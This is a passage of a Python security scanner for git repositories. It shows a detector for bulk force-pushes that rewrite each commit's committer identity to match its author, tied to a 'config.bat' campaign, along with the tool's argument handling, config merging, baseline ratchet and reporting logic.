    """Flag the bulk force-push signature: a batch of commits rewritten in one
    operation that also rewrote each commit's committer identity.

    This is the other half of the campaign. `clock-tampered-commit` catches a
    single `--amend`; this catches the moment 9, 13 or 89 commits were rewritten
    and force-pushed together, where the committer second is the instant of the
    push and bears no relation to any author second.

    Three clauses, all required, and the ordering of what each one buys was
    measured rather than assumed:

    1. At least `min_group` commits sharing an IDENTICAL committer timestamp —
       the same epoch second AND the same UTC offset.

       On its own this is unshippable, and by a wide margin: 4.5113% of corpus A
       and 3.1305% of corpus B. Legitimate bulk operations produce exactly this
       shape — a rebase replays commits faster than the clock ticks, and
       filter-branch, fast-import and vendoring drops stamp a whole batch at
       once.

    2. Every commit in the group has its committer email equal to its OWN author
       email. This is the clause that carries the rule.

       It is what separates the campaign from every legitimate bulk operation,
       because it is a property no legitimate one has. A rebase, a filter-branch
       run or an import writes ONE committer identity across the whole batch —
       the person or bot performing it. The campaign instead re-derives the
       identity per commit from that commit's own author, so the committer email
       moves from row to row in lockstep with the author email. Quizverse-web-
       frontend has nine commits all stamped 2026-07-10 13:27:30 +0200 carrying
       four different author emails, and every single committer email matches
       the author it sits beside.

    3. At least two DISTINCT author emails in the group. Without this, a solo
       developer rebasing their own branch satisfies clause 2 trivially — their
       committer email equals their author email because they are the same
       person. Clause 3 is what makes clause 2 mean "the identity was rewritten
       per commit" rather than "one person touched their own work".

    Measured, same corpora as scan_clock_tampering, at min_group=3:

      clause 1 alone        4765/105637 FP (4.5113%)   2421/77337 FP (3.1305%)
      clauses 1+3          2010/105637 FP (1.9028%)     843/77337 FP (1.0900%)
      clauses 1+2+3           0/105637 FP (0.0000%)       0/77337 FP (0.0000%)

    min_group is 3 from measurement, not taste: at 2 the full rule still costs
    262/105637 (0.2480%) and 272/77337 (0.3517%), because pairs of commits
    sharing a second are common and two rows are not enough for clause 3 to
    carry information. At 3 both corpora go to zero, and every group the rule
    then reports in the poisoned corpus is a known campaign re-push.

    One finding per group rather than per commit: the group IS the event, and
    reporting 89 identical findings for one force-push would bury it.
    """
    fmt = "%H%x01%ct%x01%ci%x01%ae%x01%ce%x01%s"
    log = git("log", f"{base}..HEAD", "--no-merges", f"--format={fmt}", cwd=root)

    groups: dict[tuple[str, str], list[tuple[str, str, str, str]]] = {}
    for line in log.splitlines():
        parts = line.split("\x01")
        if len(parts) != 6:
            continue
        sha, ct, ci, ae, ce, subject = parts
        groups.setdefault((ct, tz_offset(ci)), []).append((sha, ae, ce, subject))

    findings: list[dict] = []
    for (ct, coff), members in sorted(groups.items()):
        if len(members) < min_group:
            continue
        if not all(ae.strip().lower() == ce.strip().lower() for _, ae, ce, _ in members):
            continue
        emails = {ae.strip().lower() for _, ae, _, _ in members}
        if len(emails) < 2:
            continue

        shas = sorted(sha[:12] for sha, _, _, _ in members)
        findings.append(
            {
                "rule": "bulk-identity-rewrite",
                "severity": severity,
                "path": f"{len(members)} commits @ {ct} {coff}",
                "line": 0,
                "text": ", ".join(shas[:6]) + ("…" if len(shas) > 6 else ""),
                "message": f"{len(members)} commits share one committer timestamp "
                f"with {len(emails)} different author emails, each commit's "
                "committer email rewritten to match its own author — the "
                "config.bat bulk force-push signature",
                "fingerprint": fingerprint(
                    "bulk-identity-rewrite", f"{ct}{coff}", ",".join(shas)
                ),
            }
        )
    return findings


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--root", default=str(ROOT), help="repository to scan")
    ap.add_argument("--config", default=str(CONFIG_FILE))
    ap.add_argument("--baseline", default=str(BASELINE_FILE))
    ap.add_argument(
        "--base",
        help="merge base ref; enables the .gitignore-deletion rule",
    )
    ap.add_argument(
        "--update-baseline",
        action="store_true",
        help="record current findings as accepted, then exit 0",
    )
    ap.add_argument(
        "--all-refs",
        action="store_true",
        help="scan every ref (branch heads, remotes and fetched PR heads) "
        "instead of the checked-out tree; works on a bare or mirror clone",
    )
    ap.add_argument(
        "--ref-glob",
        action="append",
        default=[],
        help=f"ref pattern to sweep with --all-refs (repeatable; "
        f"default {' '.join(DEFAULT_REF_GLOBS)})",
    )
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    root = Path(args.root).resolve()
    # A mirror clone has no .git directory. The ref sweep is the one mode that
    # can run against one, and it is the mode the nightly sweep uses.
    if not ((root / ".git").exists() or (root / "HEAD").is_file()):
        die(f"{root} is not a git repository")

    # Repo config extends the defaults rather than replacing them, so a repo
    # adding one vendored directory cannot accidentally drop every other
    # exclusion — or, worse, every rule.
    overrides = load_json(Path(args.config), {}) or {}
    config = {
        "excludePaths": DEFAULT_CONFIG["excludePaths"]
        + list(overrides.get("excludePaths") or []),
        "dotenvAllow": DEFAULT_CONFIG["dotenvAllow"]
        + list(overrides.get("dotenvAllow") or []),
        "rules": DEFAULT_CONFIG["rules"] + list(overrides.get("extraRules") or []),
    }

    # A repo may downgrade the commit-metadata rule to a warning, but cannot
    # turn it off: a guard that can be silenced by config is not a gate. The
    # measured false-positive rate is 0.0013%, so "critical" is the default.
    clock_severity = (
        "warning"
        if str(overrides.get("clockTamperSeverity", "")).lower() == "warning"
        else "critical"
    )
    bulk_severity = (
        "warning"
        if str(overrides.get("bulkRewriteSeverity", "")).lower() == "warning"
        else "critical"
    )
    # Raising the threshold is allowed, lowering it is not. At 3 both known-good
    # corpora measure zero false positives; at 2 they do not, so a repo cannot
    # opt into the noisy setting.
    try:
        bulk_min = max(3, int(overrides.get("bulkRewriteMinGroup", 3)))
    except (TypeError, ValueError):
        bulk_min = 3

    if args.all_refs:
        findings = scan_all_refs(
            root, config, tuple(args.ref_glob) or DEFAULT_REF_GLOBS
        )
    else:
        findings = scan_repo(root, config)
    if args.base:
        findings += scan_gitignore_deletions(root, args.base)
        findings += scan_clock_tampering(root, args.base, clock_severity)
        findings += scan_bulk_identity_rewrite(root, args.base, bulk_severity, bulk_min)

    baseline_path = Path(args.baseline)
    if args.update_baseline:
        baseline_path.write_text(
            json.dumps(
                {
                    "_comment": "Accepted pre-existing findings. Ratchet only: "
                    "entries may be removed as code is cleaned up, never added "
                    "by hand. Regenerate with --update-baseline.",
                    "accepted": {
                        f["fingerprint"]: f"{f['path']}:{f['line']} {f['rule']}"
                        for f in sorted(findings, key=lambda x: (x["path"], x["line"]))
                    },
                },
                indent=2,
            )
            + "\n"
        )
        print(f"baseline written: {len(findings)} accepted finding(s)")
        return 0

    baseline = load_json(baseline_path, {}) or {}
    accepted = set((baseline.get("accepted") or {}).keys())

    new = [f for f in findings if f["fingerprint"] not in accepted]
    stale = accepted - {f["fingerprint"] for f in findings}
    blocking = [f for f in new if f["severity"] != "warning"]

    if args.json:
        print(json.dumps({"new": new, "baselined": len(findings) - len(new),
                          "blocking": len(blocking),
                          "stale": sorted(stale)}, indent=2))
        return 1 if blocking else 0

    if not new:
        print(
            f"check-remote-eval: clean "
            f"({len(findings) - len(new)} baselined, {len(stale)} stale baseline entr"
            f"{'y' if len(stale) == 1 else 'ies'})"
        )
        if stale:
            print("  baseline can be tightened: python3 scripts/check-remote-eval.py --update-baseline")
        return 0

    warned = len(new) - len(blocking)
    print(
        f"check-remote-eval: {len(new)} new finding(s) "
        f"({len(blocking)} blocking, {warned} warning)\n"
    )
    for f in sorted(new, key=lambda x: (x["path"], x["line"])):
        where = f"{f['path']}:{f['line']}" if f["line"] else f["path"]
        print(f"  [{f['severity']}] {f['rule']}  {where}")
        if f.get("refs"):
            print(
                f"      reachable from {f['refs']} ref(s), e.g. {f['ref']} "
                f"(blob {f['blob']})"
            )
        print(f"      {f['message']}")
        if f["text"]:
            print(f"      {f['text']}")
        print()
    print(
        "If a hit is genuinely necessary, annotate the line with an explained\n"
        "marker and it will be ignored:\n"
        "    // ivx-allow-eval: <why this cannot be done another way>\n\n"
        "Do not add fingerprints to the baseline by hand — it exists only so\n"
        "this guard could be switched on without reddening work already open."
    )
    if not blocking:
        print(
            "\nNothing here is blocking; this run passes. Warnings are reported so\n"
            "they are visible in review, not to stop the build."
        )
    return 1 if blocking else 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(2)
